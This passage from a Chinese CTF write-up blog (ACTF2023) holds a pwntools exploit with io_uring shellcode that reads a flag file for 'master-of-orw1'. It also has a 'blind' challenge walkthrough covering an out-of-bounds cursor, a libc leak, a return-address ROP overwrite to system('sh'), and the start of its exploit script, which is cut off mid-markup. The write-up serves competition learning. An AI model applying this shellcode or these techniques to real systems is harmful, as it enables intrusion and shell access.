class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./master-of-orw1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x15BD)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">lea    rax,[rip+0x3f9-7]</span></span><br><span class="line"><span class="string">xor    edx,edx</span></span><br><span class="line"><span class="string">push   0x1</span></span><br><span class="line"><span class="string">pop    rdi</span></span><br><span class="line"><span class="string">movq   xmm2,rax</span></span><br><span class="line"><span class="string">sub    rsp,0x108</span></span><br><span class="line"><span class="string">lea    rbx,[rsp+0x20]</span></span><br><span class="line"><span class="string">lea    rbp,[rsp+0x40]</span></span><br><span class="line"><span class="string">movq   xmm0,rbx</span></span><br><span class="line"><span class="string">push   rbp</span></span><br><span class="line"><span class="string">pop    rsi</span></span><br><span class="line"><span class="string">lea    r12,[rsp+0x18]</span></span><br><span class="line"><span class="string">punpcklqdq xmm0,xmm2</span></span><br><span class="line"><span class="string">movaps XMMWORD PTR [rsp],xmm0</span></span><br><span class="line"><span class="string">sub    rsp,0x88</span></span><br><span class="line"><span class="string">mov    r8,rdi</span></span><br><span class="line"><span class="string">xor    eax,eax</span></span><br><span class="line"><span class="string">mov    rdx,rsp</span></span><br><span class="line"><span class="string">mov    rdi,r8</span></span><br><span class="line"><span class="string">push   r12</span></span><br><span class="line"><span class="string">push   rbp</span></span><br><span class="line"><span class="string">mov    rbp,rdx</span></span><br><span class="line"><span class="string">push   rbx</span></span><br><span class="line"><span class="string">mov    rbx,rsi</span></span><br><span class="line"><span class="string">mov    rsi,rdx</span></span><br><span class="line"><span class="string">sub    rsp,0x10</span></span><br><span class="line"><span class="string">mov    esi,edi</span></span><br><span class="line"><span class="string">mov    rdi,0x1a9</span></span><br><span class="line"><span class="string">call   syscall_func</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop    r15</span></span><br><span class="line"><span class="string">lea    rdi,[rbx+0x8]</span></span><br><span class="line"><span class="string">mov    r12d,eax</span></span><br><span class="line"><span class="string">and    rdi,0xfffffffffffffff8</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbx],0x0</span></span><br><span class="line"><span class="string">mov    rdx,rbx</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbx+0xd0],0x0</span></span><br><span class="line"><span class="string">lea    rcx,[rbx+0x68]</span></span><br><span class="line"><span class="string">mov    edi,r12d</span></span><br><span class="line"><span class="string">mov    r13d,edi</span></span><br><span class="line"><span class="string">push   r12</span></span><br><span class="line"><span class="string">mov    r12,rcx</span></span><br><span class="line"><span class="string">push   rbp</span></span><br><span class="line"><span class="string">mov    rbp,rdx</span></span><br><span class="line"><span class="string">push   rbx</span></span><br><span class="line"><span class="string">mov    rbx,rsi</span></span><br><span class="line"><span class="string">push   r15</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rsi]</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rsi+0x40]</span></span><br><span class="line"><span class="string">mov    esi,DWORD PTR [rsi+0x4]</span></span><br><span class="line"><span class="string">lea    rax,[rax+rdx*4]</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rbx+0x64]</span></span><br><span class="line"><span class="string">shl    rsi,0x4</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbp+0x48],rax</span></span><br><span class="line"><span class="string">add    rsi,rdx</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rcx+0x38],rsi</span></span><br><span class="line"><span class="string">mov    rsi,QWORD PTR [rbp+0x48]</span></span><br><span class="line"><span class="string">mov    QWORD PTR [r12+0x38],rsi</span></span><br><span class="line"><span class="string">mov    r8d,r13d</span></span><br><span class="line"><span class="string">push   0x8001</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">push   0x3</span></span><br><span class="line"><span class="string">pop    rdx</span></span><br><span class="line"><span class="string">xor    edi,edi</span></span><br><span class="line"><span class="string">call   mmap64_func</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbp+0x50],rax</span></span><br><span class="line"><span class="string">mov    QWORD PTR [r12+0x40],rax</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rbx+0x28]</span></span><br><span class="line"><span class="string">mov    esi,DWORD PTR [rbx]</span></span><br><span class="line"><span class="string">mov    r9d,0x10000000</span></span><br><span class="line"><span class="string">mov    r8d,r13d</span></span><br><span class="line"><span class="string">push   0x8001</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">shl    rsi,0x6</span></span><br><span class="line"><span class="string">push   0</span></span><br><span class="line"><span class="string">pop    r15</span></span><br><span class="line"><span class="string">loop1:</span></span><br><span class="line"><span class="string">    add    rdx,rax</span></span><br><span class="line"><span class="string">    mov    QWORD PTR [rbp+r15*8],rdx</span></span><br><span class="line"><span class="string">    mov    edx,DWORD PTR [rbx+0x2c+r15*4]</span></span><br><span class="line"><span class="string">    inc    r15</span></span><br><span class="line"><span class="string">    cmp    r15, 6</span></span><br><span class="line"><span class="string">    jnz loop1</span></span><br><span class="line"><span class="string">add    rax,rdx</span></span><br><span class="line"><span class="string">mov    rdx,3</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbp+0x30],rax</span></span><br><span class="line"><span class="string">call   mmap64_func</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbp+0x38],rax</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rbx+0x50]</span></span><br><span class="line"><span class="string">mov    rax,QWORD PTR [r12+0x40]</span></span><br><span class="line"><span class="string">mov    r15,0</span></span><br><span class="line"><span class="string">loop2:</span></span><br><span class="line"><span class="string">    add    rdx,rax</span></span><br><span class="line"><span class="string">    mov    QWORD PTR [r12+r15*8],rdx</span></span><br><span class="line"><span class="string">    mov    edx,DWORD PTR [rbx+0x54+r15*4]</span></span><br><span class="line"><span class="string">    inc    r15</span></span><br><span class="line"><span class="string">    cmp    r15, 4</span></span><br><span class="line"><span class="string">    jnz loop2</span></span><br><span class="line"><span class="string">add    rdx,rax</span></span><br><span class="line"><span class="string">mov    QWORD PTR [r12+0x28],rdx</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rbx+0x64]</span></span><br><span class="line"><span class="string">add    rdx,rax</span></span><br><span class="line"><span class="string">mov    QWORD PTR [r12+0x30],rdx</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rbx+0x68]</span></span><br><span class="line"><span class="string">add    rax,rdx</span></span><br><span class="line"><span class="string">mov    QWORD PTR [r12+0x20],rax</span></span><br><span class="line"><span class="string">pop    r15</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">pop    rbp</span></span><br><span class="line"><span class="string">pop    r12</span></span><br><span class="line"><span class="string">mov    r13d,eax</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rbp+0x8]</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rbx+0xc4],r12d</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rbx+0xc0],eax</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rbp+0x14]</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rbx+0xc8],eax</span></span><br><span class="line"><span class="string">pop    r15</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">pop    rbp</span></span><br><span class="line"><span class="string">pop    r12</span></span><br><span class="line"><span class="string">add    rsp,0x88</span></span><br><span class="line"><span class="string">mov    rdi,rbp</span></span><br><span class="line"><span class="string">call   io_uring_get_sqe_func</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov    BYTE PTR [rax],0x12</span></span><br><span class="line"><span class="string">mov    WORD PTR [rax+1],0</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rax+4],0xffffff9c</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x8],0</span></span><br><span class="line"><span class="string">mov    rdx,[rsp+8]</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x10],rdx</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x18],0</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x28],0x0</span></span><br><span class="line"><span class="string">pxor   xmm0,xmm0</span></span><br><span class="line"><span class="string">movups XMMWORD PTR [rax+0x30],xmm0</span></span><br><span class="line"><span class="string">call   io_uring_submit_func</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov    rdi,rbp</span></span><br><span class="line"><span class="string">call   io_uring_wait_cqe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor    r9d,r9d</span></span><br><span class="line"><span class="string">mov    rdx,0x2000</span></span><br><span class="line"><span class="string">mov    rdx,QWORD PTR [rsp+0xa8]</span></span><br><span class="line"><span class="string">mov    ecx,0x2</span></span><br><span class="line"><span class="string">mov    esi,0x30</span></span><br><span class="line"><span class="string">mov    r8d,DWORD PTR [rax+0x8]</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rdx]</span></span><br><span class="line"><span class="string">add    eax,0x1</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdx],eax</span></span><br><span class="line"><span class="string">mov    edx,0x3</span></span><br><span class="line"><span class="string">call   mmap64_func</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov    r15,rax</span></span><br><span class="line"><span class="string">mov    rdi,rbp</span></span><br><span class="line"><span class="string">call   io_uring_get_sqe_func</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov    BYTE PTR [rax],0x17</span></span><br><span class="line"><span class="string">mov    WORD PTR [rax+1],0</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rax+4],1</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x8],0</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x10],r15</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x18],0x30</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x28],0x0</span></span><br><span class="line"><span class="string">pxor   xmm0,xmm0</span></span><br><span class="line"><span class="string">movups XMMWORD PTR [rax+0x30],xmm0</span></span><br><span class="line"><span class="string">call   io_uring_submit_func </span></span><br><span class="line"><span class="string">loop3:</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    jmp loop3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">io_uring_get_sqe_func:</span></span><br><span class="line"><span class="string">mov    rax,QWORD PTR [rdi]</span></span><br><span class="line"><span class="string">mov    ecx,DWORD PTR [rax]</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rdi+0x44]</span></span><br><span class="line"><span class="string">lea    edx,[rax+0x1]</span></span><br><span class="line"><span class="string">mov    rcx,QWORD PTR [rdi+0x10]</span></span><br><span class="line"><span class="string">and    eax,DWORD PTR [rcx]</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdi+0x44],edx</span></span><br><span class="line"><span class="string">add    rax,QWORD PTR [rdi+0x38]</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">io_uring_submit_func:</span></span><br><span class="line"><span class="string">push   r15</span></span><br><span class="line"><span class="string">mov    r10,QWORD PTR [rdi+0x8]</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rdi+0x40]</span></span><br><span class="line"><span class="string">mov    r8d,DWORD PTR [rdi+0x44]</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [r10]</span></span><br><span class="line"><span class="string">sub    r8d,edx</span></span><br><span class="line"><span class="string">mov    rcx,QWORD PTR [rdi+0x10]</span></span><br><span class="line"><span class="string">mov    r9,QWORD PTR [rdi+0x30]</span></span><br><span class="line"><span class="string">add    r8d,eax</span></span><br><span class="line"><span class="string">mov    ecx,DWORD PTR [rcx]</span></span><br><span class="line"><span class="string">nop    DWORD PTR [rax+0x0]</span></span><br><span class="line"><span class="string">mov    esi,eax</span></span><br><span class="line"><span class="string">and    edx,ecx</span></span><br><span class="line"><span class="string">add    eax,0x1</span></span><br><span class="line"><span class="string">and    esi,ecx</span></span><br><span class="line"><span class="string">mov    DWORD PTR [r9+rsi*4],edx</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rdi+0x40]</span></span><br><span class="line"><span class="string">add    edx,0x1</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdi+0x40],edx</span></span><br><span class="line"><span class="string">mov    DWORD PTR [r10],eax</span></span><br><span class="line"><span class="string">mov    rdx,QWORD PTR [rdi]</span></span><br><span class="line"><span class="string">sub    eax,DWORD PTR [rdx]</span></span><br><span class="line"><span class="string">xor    edx,edx</span></span><br><span class="line"><span class="string">mov    esi,eax</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rdi+0xc0]</span></span><br><span class="line"><span class="string">mov    ecx,eax</span></span><br><span class="line"><span class="string">and    ecx,0x2</span></span><br><span class="line"><span class="string">mov    r8d,ecx</span></span><br><span class="line"><span class="string">or     r8d,0x1</span></span><br><span class="line"><span class="string">test   al,0x1</span></span><br><span class="line"><span class="string">cmovne ecx,r8d</span></span><br><span class="line"><span class="string">mov    edi,DWORD PTR [rdi+0xc4]</span></span><br><span class="line"><span class="string">mov    r9,r8</span></span><br><span class="line"><span class="string">mov    r8d,ecx</span></span><br><span class="line"><span class="string">mov    ecx,edx</span></span><br><span class="line"><span class="string">mov    edx,esi</span></span><br><span class="line"><span class="string">mov    esi,edi</span></span><br><span class="line"><span class="string">mov    edi,0x1aa</span></span><br><span class="line"><span class="string">push   r15</span></span><br><span class="line"><span class="string">push   0x8</span></span><br><span class="line"><span class="string">call   syscall_func</span></span><br><span class="line"><span class="string">pop    rdx</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">pop    r15</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syscall_func:</span></span><br><span class="line"><span class="string">mov    rax,rdi</span></span><br><span class="line"><span class="string">mov    rdi,rsi</span></span><br><span class="line"><span class="string">mov    rsi,rdx</span></span><br><span class="line"><span class="string">mov    rdx,rcx</span></span><br><span class="line"><span class="string">mov    r10,r8</span></span><br><span class="line"><span class="string">mov    r8,r9</span></span><br><span class="line"><span class="string">mov    r9,QWORD PTR [rsp+0x8]</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">io_uring_wait_cqe:</span></span><br><span class="line"><span class="string">mov    rax,QWORD PTR [rdi+0x98]</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mmap64_func:</span></span><br><span class="line"><span class="string">mov    r10d,ecx</span></span><br><span class="line"><span class="string">push   0x9</span></span><br><span class="line"><span class="string">pop    rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(code)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Input your code&quot;</span>,shellcode + <span class="string">b&quot;\x00&quot;</span> * (<span class="number">0x3f9</span> - <span class="built_in">len</span>(shellcode)) + <span class="string">b&quot;./flag\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h2><p>本题目没有二进制文件</p>
<p><strong>漏洞分析</strong></p>
<p>本题目实现了一个简单的交互系统：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[a]aaaaa</span><br></pre></td></tr></table></figure>
<ul>
<li>A/D：左移/右移 <code>[]</code>，用以选中不同的对象</li>
<li>W/S：使目标对象的 asicc 值 <code>+1/-1</code></li>
<li>空格：大写字母/小写字母的切换</li>
<li>回车：执行程序</li>
</ul>
<p>程序在 <code>aaaaaa</code> 字符后有一个指针，指向了 <code>aaaaaa</code> 字符的地址，后续的 printf 将会使用该地址来打印数据</p>
<p>程序没有限制 A/D 的范围，导致我们可以将 <code>[]</code> 移动到 <code>aaaaaa</code> 后的地址上，然后使用 W/S 来修改该地址，从而使后续的 printf 输出错误的数据</p>
<p><strong>入侵思路</strong></p>
<p>在比赛时测试的内存结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaa pointer heap_addr libc_addr stack_addr</span><br></pre></td></tr></table></figure>
<ul>
<li>经过测试，这个 libc_addr 就是返回地址</li>
</ul>
<p>泄露的 libc_base 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] leak_addr &gt;&gt; <span class="number">0x7f4a645e2d0a</span></span><br><span class="line">[+] __libc_start_main &gt;&gt; <span class="number">0x7f4a645e2d0a</span></span><br></pre></td></tr></table></figure>
<p>查找到的 libc 版本如下：</p>
<img src="/2023/11/01/ACTF2023/1698753907976.png" class width="1698753907976"> 
<p>泄露 libc_base 后，我们就可以继续移动 <code>[]</code> 到后续的返回地址处，使用 W/S 来修改返回地址为 ROP 链</p>
<p>最后有一个十分恶心的问题，题目远程 <code>/bin/sh</code> 的偏移和本地 libc 的不同，这里只能尝试将 RDI 设置为某个明显的字符串，然后通过这个字符串的位置来逐步计算 <code>/bin/sh</code> 的偏移</p>
<ul>
<li>比赛时没有找到 <code>/bin/sh</code>，而是找到一个末尾是 <code>sh</code> 的字符串</li>
<li>然后计算 <code>sh</code> 的偏移执行 <code>system(&quot;sh&quot;)</code> 拿到 shell</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elf = ELF(challenge)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span 